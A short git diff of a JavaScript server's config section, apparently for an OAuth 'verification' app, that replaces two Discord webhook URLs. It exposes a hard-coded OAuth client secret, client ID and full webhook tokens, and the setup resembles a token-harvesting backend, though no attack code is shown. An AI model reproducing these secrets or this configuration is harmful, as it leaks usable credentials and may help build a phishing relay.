@@ -2,8 +2,8 @@
 const client_secret = '81a0ccfa-100a-4b07-9ec1-632e728ec6fb'
 const client_id = 'e12e4369-c51a-484f-9dcf-3170fd7b8f9b'
 const redirect_uri = 'https://verification-auq7.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1107389620603330591/SZb7XWNFkuQ9ZjW23Ph7KCMFfTmjJuB3DyTmw1o6H9TkgB1QN4NOUwnKg_nmpVwnkUfy'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1107389620603330591/SZb7XWNFkuQ9ZjW23Ph7KCMFfTmjJuB3DyTmw1o6H9TkgB1QN4NOUwnKg_nmpVwnkUfy'
+const webhook_url = 'https://discord.com/api/webhooks/1107404091199606884/cmFI_WpG1r9dlXhraAKHd2UWzVYwhLfYNWsgYQ8KzGO0__xzeLvBmRLaGkVAmrtpha4Y'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1107404091199606884/cmFI_WpG1r9dlXhraAKHd2UWzVYwhLfYNWsgYQ8KzGO0__xzeLvBmRLaGkVAmrtpha4Y'
 // Config end
 const axios = require('axios')
 const express = require('express')
